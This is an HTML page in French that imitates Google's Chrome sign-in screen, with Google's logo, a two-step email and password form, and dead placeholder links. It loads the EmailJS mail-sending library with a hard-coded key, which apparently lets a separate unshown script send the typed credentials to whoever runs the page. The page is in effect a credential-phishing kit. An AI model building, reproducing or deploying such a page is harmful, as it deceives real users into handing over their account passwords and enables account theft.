<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Google</title>
    <link rel="stylesheet" href="file.css">
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("KCIGlaJ8Pj2g2jmbz"); // Remplacez par votre clé API publique
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_284x96dp.png" alt="Google Logo">
            </div>
            <h2>Se connecter à Chrome</h2>
            <p>Utilisez votre compte Google</p>

            <!-- Formulaire d'email -->
            <form id="email-form">
                <div class="input-group">
                    <label for="email">Adresse e-mail ou téléphone</label>
                    <input type="email" id="email" name="email" placeholder="Adresse e-mail ou téléphone" required>
                </div>
                <div class="forgot-email">
                    <a href="#">Adresse e-mail oubliée ?</a>
                </div>
                <div class="incognito-mode">
                    <p>Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé. <a href="#">En savoir plus</a>.</p>
                </div>
                <button type="submit">Suivant</button>
            </form>

            <!-- Formulaire du mot de passe (caché au départ) -->
            <form id="password-form" style="display: none;">
                <button type="button" id="back-btn">← Retour</button>
                <div class="input-group">
                    <label for="password">Mot de passe</label>
                    <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
                </div>
                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                <button type="submit">Se connecter</button>
            </form>

            <div class="footer-links">
                <a href="#">Créer un compte</a>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="language">
                <select>
                    <option value="fr">Français (France)</option>
                </select>
            </div>
            <div class="links">
                <a href="#">Aide</a>
                <a href="#">Confidentialité</a>
                <a href="#">Conditions</a>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
